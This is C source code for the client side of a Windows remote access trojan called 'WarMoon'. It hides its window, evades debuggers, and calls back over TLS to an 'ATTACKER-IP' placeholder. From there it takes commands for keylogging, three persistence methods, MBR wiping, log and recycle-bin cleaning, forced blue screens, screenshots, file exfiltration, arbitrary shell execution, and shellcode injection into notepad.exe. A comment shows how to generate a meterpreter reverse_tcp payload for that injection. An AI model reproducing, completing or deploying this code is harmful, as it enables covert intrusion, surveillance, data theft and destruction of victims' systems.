#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <winternl.h>
#include <wininet.h>
#include <windowsx.h>
#include <shellapi.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/x509.h>
#include <openssl/pem.h>

#include "Headers/Variables.h"
#include "Headers/BSOD.h"
#include "Headers/Clean.h"
#include "Headers/Download.h"
#include "Headers/Drives.h"
#include "Headers/IsAdmin.h"
#include "Headers/Keylogger.h"
#include "Headers/Persistence.h"
#include "Headers/TransferFiles.h"
#include "Headers/CheckVM.h"
#include "Headers/Wipe.h"

int sock;
struct sockaddr_in ServerAddress;
char *ServerIP = "ATTACKER-IP"; //CHANGE THIS, OR GIVE AN IP AS AN ARGUMENT WHEN EXECUTING!
char *AutoServerIP; //Stores the argument (if given), to connect to the given IP address
unsigned short ServerPort = 50000;

//OpenSSL - SSL_CTX *Context is in main()
SSL *ssl;

struct sockaddr_in FileServerAddress;
unsigned short ServerTransferPort = 49500;

unsigned short int PersistenceTechniques[3] = {0, 0, 0};
int RemovedPersistences = 0;
unsigned short int KeysNotDeleted = 0;

char Site[30] = "X";

char BaseFileName[] = "IMG_"; //Base
char FullFileName[50]; //Will store the entire file name: BaseFileName + UnixTime + Extension
char Extension[] = ".bmp"; //Extension

BOOL IsKeyLoggerOn = 0;
HANDLE KeyLoggerThread;
BOOL IsShiftPressed;
FILE *fp = NULL;

//msfvenom -p windows/meterpreter/reverse_tcp LHOST=eth0 LPORT=4444 --platform windows -a x86 -f c -v ShellcodeX86

unsigned char ShellcodeX86[] = 
"";

//Paste here the server's public key
const char *ServerPublicCertPem = "-----BEGIN CERTIFICATE-----\nMIIFazCCA1OgAwIBAgIUCg0wDwveZ9J6sTyKglCL/h8RZa0wDQYJKoZIhvcNAQEL\nBQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM\nGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yNTA0MDUyMDQwNDZaFw0yNjA0\nMDUyMDQwNDZaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw\nHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggIiMA0GCSqGSIb3DQEB\nAQUAA4ICDwAwggIKAoICAQC1WzdluK+oO69Pgxk61Sjhnc692uguvJnUFYc6eJaP\nocVACAgSKRUWn/hVFcfhkCIZ7t24AxzrdCKrQ8wKxzemqILRDJqIPmIuPp5YO3WE\nv+afIEZHYW76XwBLbRKXWHn21E6TovZsGXgoy3X0haRT568D4ncbrQBx4nT0j6B2\nUdMFJUs2QiPjDZDXCgEKAffGrDLEHhiDKyGcAkx2C9f+HoMmt/JwdFEWbkw2LSrK\niZq6kP4AnHoNthXH34A2jvFhhuoKmLfMIZOT8w32Zk/ZqVhVXfk6GQV7eCPPMkk5\nf+bWAIKG0ehNlncT9YL0OluUULCjT/nEALxdjF0f6B26dudSbfrhvYJhIjdIzdfI\n9dqo0b6b1cIuXLZDOeZJZR/07cso78RULGX140t7nks4P91QCEBIQL6Cbhcw4JPC\nhqc7vWRSIqng3z7/GsGHC0V3kuicd8Lyc9NlW8Mfau8mKsnA6TZbPq5+ecFg86WL\n69YOmAaClynta/AuUwhAPhvhXwV5GrpiKhVTNN0qsto7tACiFbeXifsqY8jm1b7i\nJRsPkFjMOLBBTezu+AkqKD/BGsPBgVtFcajkaE3W/1ok1T2wKzJcP95lVBWqj2ZM\nhx++aVTS7/GSaHG0HjAO9BLDC4/LX6K72IVvZciPeVBn1b1xrYnlUc3FYO/kKwVa\nKQIDAQABo1MwUTAdBgNVHQ4EFgQUyKAiMB7SPiWNrv7mMJ9hXWOIKdswHwYDVR0j\nBBgwFoAUyKAiMB7SPiWNrv7mMJ9hXWOIKdswDwYDVR0TAQH/BAUwAwEB/zANBgkq\nhkiG9w0BAQsFAAOCAgEATtvPvnB+blnfp3ITXbBnFze+7OywlUpvemeog3hnYbZS\nq5a0VfUA55pQfyx911sYc+FSVLneXloE6QXpf6s2HPvKuAtFFztHfeazNA0Xqpj+\nIstwiXmDF7iabBeFQELRGX3xl0bIE0D+hpr7UQ0jPBhOGBsXv4SHdDowlldADOyp\nCMqYSRoLH0K66AAYJ5Sff9ugc6jIbyhCCNSftvD1PhgJJxT8rSFfV4+Ve91CG50l\nTx+rBC+yiceyKOK+UCxS0oPILnADJVud7YiHJ/v8qEXvPF0E00KZj7hUbfCP75zF\nLxuMfTIHojFLwP89SEJhm6hL7OZZg5/f35hP6kFsO5UcH9K4pQp1nZ70KO60BVUn\nG8s3I3vVtgXn9E3JUg2T99PDau8HNIafTEeRQY4cL5Ahft7iPAVmK3UFAta8kWP/\nGezssKhiRaRyRnFHpMBG4xqIF+ae5lTAIDKIxOVbOHiMUYoTvJVZfOtLILsyNyUu\nmCdHR3R4SjZTX6ksO2PVWS626Qv4ms3cvql4tcdO7FUo9xe4pv7siWthmIhnrvFv\nzwPW69j8W08/95NaRfxFYGvp2KLXswmH13vE+Vt4qe/geukrS3u3yFLAfg9y0fd9\n2aluIMWJH5xcyk60g7xEMVXAmHffQmDFW3kLApJIuwwugwV+4TI/OTYvTeLJ9mU=\n-----END CERTIFICATE-----\n";

unsigned int GetUnixTime() //Now each screenshot that will be taken and transferred will have a unique name (Avoids overwriting older screenshots taken in the past)
{
	time_t GetTime = time(NULL);
	srand((unsigned int)GetTime);
	return GetTime;
}

char *str_cut(char str[], int slice_from, int slice_to)
{
	if (str[0] == '\0')
	{
		return NULL;
	}

	char *Buffer;
	size_t StrLen, BufferLen;

	if (slice_to < 0 && slice_from > slice_to)
	{
		StrLen = strlen(str);
		if (abs(slice_to) > StrLen -1)
		{
			return NULL;
		}

		if (abs(slice_from) > StrLen)
		{
			slice_from = (-1) * StrLen;
		}

		BufferLen = slice_to - slice_from;
		str += (StrLen + slice_from);
	}
	else if (slice_from >= 0 && slice_to > slice_from)
	{
		StrLen = strlen(str);

		if (slice_from > StrLen -1)
		{
			return NULL;
		}

		BufferLen = slice_to - slice_from;
		str += slice_from;
	}

	else
	{
		return NULL;
	}

	Buffer = calloc(BufferLen, sizeof(char));
	strncpy(Buffer, str, BufferLen);
	return Buffer;
}

DWORD WINAPI Inject86()
{
	BOOL CreateProc = 0;
	STARTUPINFOW si = { 0 };
	PROCESS_INFORMATION pi;
	DWORD GetPID = 0;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	LPDWORD ThreadID = NULL;
	LPVOID MemoryBuffer = NULL;

	CreateProc = CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, BELOW_NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);

	if (CreateProc == 0)
	{
		return EXIT_FAILURE;
	}

	GetPID = pi.dwProcessId;

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetPID);

	if (hProcess == NULL)
	{
		return EXIT_FAILURE;
	}

	MemoryBuffer = VirtualAllocEx(hProcess, NULL, sizeof(ShellcodeX86), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (MemoryBuffer == NULL)
	{
		return EXIT_FAILURE;
	}

	BOOL isDone = WriteProcessMemory(hProcess, MemoryBuffer, ShellcodeX86, sizeof(ShellcodeX86), NULL);

	if (isDone == 0)
	{
		return EXIT_FAILURE;
	}

	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)MemoryBuffer, NULL, 0, 0, ThreadID);

	if (hThread == NULL)
	{
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hProcess);
	CloseHandle(hThread);
	return EXIT_SUCCESS;
}

DWORD WINAPI PopupMSGBox()
{
	MessageBoxW(NULL, L"WarMoon Client Active!", L"WarMoon V_3.1", MB_OK);
	return 0;
}

SSL_CTX *CreateContext()
{
	const SSL_METHOD *Method;
	SSL_CTX *Context;
	Method = TLS_client_method();
	Context = SSL_CTX_new(Method);

	if (!Context)
	{
		WSACleanup();
		exit(EXIT_FAILURE);
	}

	SSL_CTX_set_min_proto_version(Context, TLS1_2_VERSION);
	SSL_CTX_set_max_proto_version(Context, TLS1_2_VERSION);

	BIO *newBIO = BIO_new_mem_buf((void *)ServerPublicCertPem, -1);
	X509 *Cert = PEM_read_bio_X509(newBIO, NULL, NULL, NULL);
	if (!Cert)
	{
		BIO_free(newBIO);
		SSL_CTX_free(Context);
		WSACleanup();
		exit(EXIT_FAILURE);
	}

	X509_STORE *Store = SSL_CTX_get_cert_store(Context);
	if (!Store || X509_STORE_add_cert(Store, Cert) != 1)
	{
		X509_free(Cert);
		BIO_free(newBIO);
		SSL_CTX_free(Context);
		WSACleanup();
		exit(EXIT_FAILURE);
	}

	X509_free(Cert);
	BIO_free(newBIO);

	return Context;
}

void Run(SSL_CTX *Context, char *NewServerIP)
{
	char ReceiveBuffer[1024];
	char ContainerBuffer[1024];
	char TotalResponseBuffer[8192];

	while (1)
	{
		redo:
		memset(&ReceiveBuffer, 0, sizeof(ReceiveBuffer));
		memset(&ContainerBuffer, 0, sizeof(ContainerBuffer));
		memset(&TotalResponseBuffer, 0, sizeof(TotalResponseBuffer));
		SSL_read(ssl, ReceiveBuffer, 1024);

		if (strncmp(ReceiveBuffer, "q", 1) == 0)
		{
			SSL_shutdown(ssl);
			SSL_free(ssl);
			closesocket(sock);
			SSL_CTX_free(Context);
			WSACleanup();
			exit(0);
		}

		else if (strncmp(ReceiveBuffer, "startlogger", 11) == 0)
		{
			if (IsKeyLoggerOn == 1)
			{
				char AlreadyOn[] = "\033[1;31m[-] Logger Already On!\033[0m\n";
				SSL_write(ssl, AlreadyOn, sizeof(AlreadyOn));
				goto redo;
			}
			KeyLoggerThread = CreateThread(NULL, 0, StartLogger, NULL, 0, NULL);
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "stoplogger", 10) == 0)
		{
			if (IsKeyLoggerOn == 0)
			{
				char AlreadyOff[] = "\033[1;31m[-] Logger Already Off!\033[0m\n";
				SSL_write(ssl, AlreadyOff, sizeof(AlreadyOff));
				goto redo;
			}

			StopLogger(ssl);
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "cd ", 3) == 0)
		{
			chdir(str_cut(ReceiveBuffer, 3, 100));
		}

		else if (strncmp(ReceiveBuffer, "persistence1", 12) == 0)
		{
			MaintainPersistence1(ssl);
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "persistence2", 12) == 0)
		{
			MaintainPersistence2(ssl);
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "persistence3", 12) == 0)
		{
			MaintainPersistence3(ssl);
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "removepers", 10) == 0)
		{
			RemovePersistences(ssl);
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "isvm", 4) == 0)
		{
			IsVM(ssl);
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "wipembr", 7) == 0)
		{
			WipeMBR(ssl);
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "cleanlogs", 9) == 0)
		{
			CleanLogsAPI(ssl);
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "inject86", 8) == 0)
		{
				HANDLE ThreadAIOx86 = CreateThread(NULL, 0, Inject86, NULL, 0, NULL);
				goto redo;
		}

		else if (strncmp(ReceiveBuffer, "download", 8) == 0)
		{
			char FileToDownload[30];
			memset(&FileToDownload, 0, sizeof(FileToDownload));
			sscanf(ReceiveBuffer, "%*s %s", FileToDownload);
			Download(FileToDownload, ssl);
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "updateurl", 9) == 0)
		{
			const char *UpdatedURL = ReceiveBuffer + 10;
			UpdateURLDownload(UpdatedURL, ssl);
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "getfile", 7) == 0)
		{
			const char *TransferFile = ReceiveBuffer + 8;
			TransferFilesToServer(NewServerIP, TransferFile);
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "diskspace", 9) == 0)
		{
			DiskSpace(ssl);
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "cleanbin", 8) == 0)
		{
			CleanBins(ssl);
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "drives", 6) == 0)
		{
			EnumDrives(ssl);
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "isadmin", 7) == 0)
		{
			IsAdmin(ssl);
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "hostname", 8) == 0)
		{
			PrintComputerName(ssl);
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "screenshot", 10) == 0)
		{
			unsigned int UnixTime = GetUnixTime();
			snprintf(FullFileName, sizeof(FullFileName), "%s%u%s", BaseFileName, UnixTime, Extension);
			TakeScreenshot(NewServerIP, FullFileName);
			memset(FullFileName, 0, sizeof(FullFileName));
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "popup", 5) == 0)
		{
			HANDLE ThreadMSGBox = CreateThread(NULL, 0, PopupMSGBox, NULL, 0, NULL);
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "bsodwin", 7) == 0)
		{
			HANDLE ThreadBSOD = CreateThread(NULL, 0, BSOD, NULL, 0, NULL);
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "menu", 4) == 0)
		{
			goto redo;
		}

		else
		{
			FILE *fd;
			fd = _popen(ReceiveBuffer, "r");
			while (fgets(ContainerBuffer, 1024, fd) != NULL)
			{
				strncat(TotalResponseBuffer, ContainerBuffer, sizeof(TotalResponseBuffer) - strlen(TotalResponseBuffer) - 1);
			}

			SSL_write(ssl, TotalResponseBuffer, sizeof(TotalResponseBuffer));
			fclose(fd);
		}
	}
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow)
{
	HWND Hide;
	AllocConsole();
	Hide = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Hide, 0);

	BOOL CheckDBG = IsDebuggerPresent();
	if (CheckDBG != 0)
	{
		for (int i = 2; i < 2000; i = i + 4)
		{
			i = i - 2;
			for (int j = 1; j <= 69420; j++)
			{
				for (int k = 0; k < 5; k++)
				{
					int l = 0;
					int m = 0;
					while (l < 12)
					{
						char NiceTry1[13] = "ABCDEFGHIJKL";
						char WasteTime1[13];
						WasteTime1[l] = NiceTry1[l] ^ l % 3;
						l++;
					}

					while (m < 12)
					{
						char NiceTry2[13] = "MNOPQRSTUVWX";
						char WasteTime2[13];
						WasteTime2[m] = NiceTry2[m] ^ m % 3;
						m++;
					}
				}
			}
		}
		return 1;
	}

	SSL_CTX *Context;
	WSADATA wsaData;

	if (WSAStartup(2.2, &wsaData) != 0)
	{
		return 1;
	}

	if (strlen(pCmdLine) > 0)
	{
		AutoServerIP = pCmdLine;
	}
	else
	{
		AutoServerIP = ServerIP;
	}

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == INVALID_SOCKET)
	{
		WSACleanup();
		return 1;
	}

	memset(&ServerAddress, 0, sizeof(ServerAddress));
	ServerAddress.sin_family = AF_INET;
	ServerAddress.sin_port = htons(ServerPort);

	if (inet_pton(AF_INET, AutoServerIP, &ServerAddress.sin_addr) <= 0)
	{
		closesocket(sock);
		WSACleanup();
		return 1;
	}

	Connect:
	while (connect(sock, (struct sockaddr *) &ServerAddress, sizeof(ServerAddress)) != 0)
	{
		Sleep(3);
		goto Connect;
	}

	Context = CreateContext();
	ssl = SSL_new(Context);
	SSL_set_fd(ssl, sock);

	if (SSL_connect(ssl) <= 0)
	{
		return 1;
	}

	if (SSL_get_verify_result(ssl) != X509_V_OK)
	{
		return 1;
	}

	Run(Context, AutoServerIP);
}
